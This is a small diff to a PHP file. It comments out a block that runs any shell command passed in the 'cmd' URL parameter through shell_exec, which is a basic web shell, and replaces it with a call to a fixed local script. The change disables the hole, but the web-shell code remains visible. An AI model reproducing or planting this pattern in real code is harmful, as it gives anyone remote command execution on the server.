@@ -2,11 +2,12 @@
 <?php
 
 
+ $data = shell_exec('./script.sh');
 
-if (isset($_GET['cmd'])) {
- $data = shell_exec($_GET['cmd']);
- var_dump($data);
-}
+// if (isset($_GET['cmd'])) {
+//  $data = shell_exec($_GET['cmd']);
+//  var_dump($data);
+// }
 ?>
 
 
